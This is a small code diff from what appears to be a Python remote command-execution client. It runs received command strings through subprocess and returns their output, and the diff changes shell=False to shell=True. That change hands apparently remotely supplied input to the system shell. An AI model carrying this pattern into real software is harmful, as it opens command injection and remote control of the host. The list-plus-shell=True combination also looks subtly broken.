@@ -158,7 +158,7 @@ class client:
             try:
                 cmd = cmd[:].decode("utf-8")
                 cmd = cmd.split(" ")
-                result = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 result_in_bytes = result.stdout.read() + result.stderr.read()
                 result_in_string = str(result_in_bytes, "utf-8")
                 if len(result_in_string) == 0:
